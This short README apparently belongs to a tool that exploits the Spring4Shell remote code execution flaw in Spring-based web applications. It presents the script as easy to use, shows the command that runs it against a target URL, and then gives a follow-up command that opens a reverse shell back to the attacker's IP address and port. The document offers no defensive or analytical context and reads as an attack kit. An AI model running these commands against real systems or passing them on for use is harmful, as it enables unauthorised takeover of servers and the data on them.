# Spring4shell

Simple and easy to use script to exploit spring4shell vulnerability.

```bash
./spring4shell.py <scheme://host:port/endpoint>
```

After the exploit is run, getting a reverse shell is a simple as:
```bash
revsh <your-ip> <your-port>
```
